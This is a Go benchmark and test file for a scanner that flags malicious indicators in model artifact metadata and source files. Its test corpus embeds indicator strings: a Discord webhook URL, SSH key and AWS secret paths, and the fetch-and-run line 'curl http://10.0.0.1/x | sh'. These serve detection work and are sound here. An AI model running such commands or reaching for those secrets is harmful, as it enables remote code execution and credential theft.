package stringscan

import (
	"strings"
	"testing"
)

// benchCorpus builds a buffer of the size and shape a real artifact metadata blob or
// source file has: mostly ordinary text with a handful of indicators.
func benchCorpus(n int) []byte {
	line := "the model was trained on a large corpus of text and evaluates on held-out splits; "
	var b strings.Builder
	b.Grow(n + 512)
	for b.Len() < n {
		b.WriteString(line)
	}
	s := b.String()
	out := []byte(s)
	// Sprinkle indicators so the scanner cannot be fast by finding nothing.
	for _, lit := range []string{
		"https://discord.com/api/webhooks/123",
		"~/.ssh/id_rsa",
		"AWS_SECRET_ACCESS_KEY=",
		"curl http://10.0.0.1/x | sh",
		"base64.b64decode",
	} {
		at := len(out) / 3
		copy(out[at:], lit)
	}
	return out
}

func BenchmarkScanClean(b *testing.B) {
	buf := benchCorpus(1 << 20)
	dst := make([]Hit, 0, 64)
	b.SetBytes(int64(len(buf)))
	b.ReportAllocs()
	b.ResetTimer()
	for b.Loop() {
		dst = ScanInto(buf, dst)
	}
	_ = dst
}

func BenchmarkScanIndicators(b *testing.B) {
	buf := []byte(strings.Repeat("hook https://discord.com/api/webhooks/1 and ~/.ssh ", 20000))
	dst := make([]Hit, 0, 64)
	b.SetBytes(int64(len(buf)))
	b.ReportAllocs()
	b.ResetTimer()
	for b.Loop() {
		dst = ScanInto(buf, dst)
	}
	_ = dst
}

// benchKernelCorpus builds the buffer the full-file histogram/entropy pass sees:
// a checkpoint body, i.e. bytes with no text structure to predict. It is a
// deterministic LCG, so the measurement is reproducible.
func benchKernelCorpus(n int) []byte {
	b := make([]byte, n)
	x := uint32(0x2545f491)
	for i := range b {
		x = x*1664525 + 1013904223
		b[i] = byte(x >> 24)
	}
	return b
}

// BenchmarkKernelHistogram measures the byte-class histogram on the two shapes it
// could be applied to: a checkpoint body (bytes with no text structure to predict)
// and prose. It is the measurement behind the throughput figure quoted in
// docs/architecture.md, the Makefile and kernel.go's header: those sites agreed on
// no single number, and nothing in the tree measured it.
func BenchmarkKernelHistogram(b *testing.B) {
	for _, tc := range []struct {
		name string
		buf  []byte
	}{
		{"tensor-body", benchKernelCorpus(1 << 20)},
		{"text", benchCorpus(1 << 20)},
	} {
		b.Run(tc.name, func(b *testing.B) {
			var counts [7]int64
			b.SetBytes(int64(len(tc.buf)))
			b.ReportAllocs()
			b.ResetTimer()
			for b.Loop() {
				histogram(tc.buf, &counts)
			}
			_ = counts
		})
	}
}

// BenchmarkKernelEntropy measures the Shannon entropy pass — the 256-bin count —
// over the same two shapes. It is the other half of the same row in
// docs/architecture.md.
func BenchmarkKernelEntropy(b *testing.B) {
	for _, tc := range []struct {
		name string
		buf  []byte
	}{
		{"tensor-body", benchKernelCorpus(1 << 20)},
		{"text", benchCorpus(1 << 20)},
	} {
		b.Run(tc.name, func(b *testing.B) {
			b.SetBytes(int64(len(tc.buf)))
			b.ReportAllocs()
			b.ResetTimer()
			var h float64
			for b.Loop() {
				h = entropyBits(tc.buf)
			}
			_ = h
		})
	}
}

// TestScanIntoCostsNothingWhenThereIsNothingToReport is the plan's zero-allocation
// assertion for the shared engine. It is exact rather than a bound because the
// engine's contract on the hot path is that a clean buffer costs no allocation at
// all: the automaton is built once, the hits slice is the caller's, and every
// detector keeps its state in fixed-size locals.
func TestScanIntoCostsNothingWhenThereIsNothingToReport(t *testing.T) {
	clean := []byte(strings.Repeat("ordinary metadata value, no indicators here. ", 64))
	dst := make([]Hit, 0, 16)
	allocs := testing.AllocsPerRun(200, func() {
		dst = ScanInto(clean, dst)
	})
	if allocs != 0 {
		t.Fatalf("ScanInto allocated %.2f times per run on a clean buffer, want 0", allocs)
	}
}

// TestScanAllocatesOnlyForHits is the other half: when something is found, the
// allocation must be proportional to the hit count, not to the buffer.
func TestScanAllocatesOnlyForHits(t *testing.T) {
	one := []byte("a value with exactly one https://discord.com/api/webhooks/1 in it")
	dst := make([]Hit, 0, 16)
	allocs := testing.AllocsPerRun(200, func() {
		dst = ScanInto(one, dst)
	})
	if allocs > 4 {
		t.Fatalf("one hit cost %.2f allocations, want a small constant", allocs)
	}
}
